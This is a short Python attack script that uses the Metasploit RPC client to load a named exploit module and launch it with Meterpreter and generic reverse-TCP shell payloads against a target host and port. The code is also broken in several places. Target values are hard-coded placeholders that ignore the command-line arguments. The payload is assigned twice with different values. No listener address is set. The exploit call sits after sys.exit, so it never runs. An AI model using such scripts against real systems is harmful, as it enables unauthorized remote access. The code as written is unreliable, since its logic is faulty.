import sys
from metasploit.msfrpc import MsfRpcClient

def exploit_target(client):
    target_host = 'THE TARGET IP'
    target_port = "PORT"  
    payload = 'windows/meterpreter/reverse_tcp'
    exploit = client.modules.use('exploit', 'exploit_name_here')
    exploit['RHOST'] = target_host
    exploit['RPORT'] = target_port
    exploit.payload = payload
    exploit.execute(payload='generic/shell_reverse_tcp')

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("USE THIS CMD PLEASE: python exploit.py <RHOST> <RPORT> <exploit_name>")
        sys.exit(1)

    rhost = sys.argv[1]
    rport = sys.argv[2]
    exploit_name = sys.argv[3]


    try:
        client = MsfRpcClient('USERNAME', 'PASSWORD')
        if exploit_name not in client.modules.exploits:
            print("Exploit not found")
            sys.exit(1)
            exploit_target(client)

    except Exception as e:
        print("An error occurred:", str(e))
